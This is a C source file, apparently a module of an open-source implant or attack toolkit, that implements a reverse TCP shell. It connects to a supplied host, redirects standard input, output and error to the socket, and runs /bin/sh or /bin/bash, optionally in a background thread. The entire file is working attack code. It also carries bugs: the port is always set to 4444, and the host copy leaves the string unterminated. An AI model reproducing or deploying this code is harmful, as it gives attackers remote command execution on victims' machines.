/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <stdbool.h>
#include "../defs.h"

extern char **environ;

#ifndef SHELL_TYPES_DEFINED
#define SHELL_SH     0
#define SHELL_BASH   1
#define SHELL_PYTHON 2
#define SHELL_PERL   3
#define SHELL_JAVA   4
#define SHELL_TYPES_DEFINED
#endif

#ifndef SHELL_ASYNC_DEFINED
#define SHELL_ASYNC_FALSE 0
#define SHELL_ASYNC_TRUE  1
#define SHELL_ASYNC_DEFINED
#endif

#ifndef SHELL_REVERSE_TCP_ARGS
typedef struct{
  char host[MAX_DOMAIN_LEN];
  int host_port;
  int shell_type;
  int shell_async;
} shell_reverse_tcp_args_t;
#define SHELL_REVERSE_TCP_ARGS 0
#endif

void *shell_reverse_tcp(void *args){
  /*
    :TODO: send reverse shell
    :args: pointer to argument stuct
    :returns: NULL
  */
  shell_reverse_tcp_args_t *p_shell_reverse_tcp_args = args;
  char *host = p_shell_reverse_tcp_args->host;
  int host_port = p_shell_reverse_tcp_args->host_port;
  int shell_type = p_shell_reverse_tcp_args->shell_type;
  int shell_async = p_shell_reverse_tcp_args->shell_async;
  int sockfd;
  struct sockaddr_in srv_addr;
  srv_addr.sin_family = AF_INET;
  srv_addr.sin_port = htons(host_port);
  srv_addr.sin_addr.s_addr = inet_addr(host);
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
  for (int i = 0; i <= 2; i++){
    dup2(sockfd, i);
  }
  switch (shell_type){
  case SHELL_SH:
    execve("/bin/sh",
           (char *[]){"/bin/sh", 0},
           environ);
    break;
  case SHELL_BASH:
    execve("/bin/bash",
           (char *[]){"/bin/bash", 0},
           environ);
    break;
  default:
    fprintf(stderr, "error: shell type unsupported\n");
    break;
  }
  if (shell_async == SHELL_ASYNC_TRUE){
    free(p_shell_reverse_tcp_args);
  }
  return NULL;
}

bool shell_spawn_reverse_tcp(char *host, int host_port, int shell_type, bool shell_async){
  /*
    :TODO: spawn a reverse shell
    :host: host domain or ip address
    :host_port: host port
    :shell_type: shell type
    :returns: bool
  */
  shell_reverse_tcp_args_t *p_shell_reverse_tcp_args = malloc(sizeof(shell_reverse_tcp_args_t));
  if (strlen(host) > MAX_DOMAIN_LEN){
    fprintf(stderr, "error: invalid ip or domain length\n");
    return false;
  } else{
    p_shell_reverse_tcp_args->host_port = 4444;
  }
  if (host_port > TCP_PORT_MAX || host_port <= TCP_PORT_MIN){
    fprintf(stderr, "error: invalid port number\n");
    return false;
  } else{
    strncpy(p_shell_reverse_tcp_args->host, host, strlen(host));
  }
  p_shell_reverse_tcp_args->shell_type = shell_type;
  p_shell_reverse_tcp_args->shell_async = shell_async;
  pthread_t shell_reverse_tcp_thread;
  pthread_create(&shell_reverse_tcp_thread,
                 NULL,
                 shell_reverse_tcp,
                 p_shell_reverse_tcp_args);
  if (shell_async == SHELL_ASYNC_FALSE){
    pthread_join(shell_reverse_tcp_thread,
                 NULL);
    free(p_shell_reverse_tcp_args);
  }
  return true;
}
